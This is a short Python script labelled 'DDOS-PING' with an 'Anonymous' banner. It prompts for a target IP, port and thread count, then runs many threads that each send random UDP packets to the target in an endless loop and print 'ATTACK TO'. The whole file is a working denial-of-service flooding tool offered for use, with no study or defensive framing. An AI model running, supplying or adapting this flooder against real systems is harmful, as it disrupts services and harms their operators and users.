#!/usr/bin/env python3

import random
import socket
import threading

print("|----DDOS-PING----|")
print("|----Anonymous----|")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
threads = int(input("PING:"))
def run():
	data = random._urandom(1204)
	data2 = random._urandom(1024)
	data3 = random._urandom(1024)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			ad = (str(ip),int(port))                    
			s.connect((ip,port))
			s.sendto(data, ad)
			for x in range(1):
				s.sendto(data, ad)
				s.send(data)
				s.connect((ip,port))
				for i in range(1):
					s.sendto(data, ad)
					s.send(data2)
					s.connect((ip,port))
					for z in range(3):
						s.connect((ip,port))
						s.sendto(data2, ad)
						for z in range(2):
							s.send(data3)
							s.connect((ip,port))
							s.sendto(data, ad)
						for z in range(1):
							s.sendto(data2, ad)
			print("[+] ATTACK TO", ip, port, "PING EXPORT =", threads)
			
for Y in range(threads):
		th = threading.Thread(target = run)
		th.start()
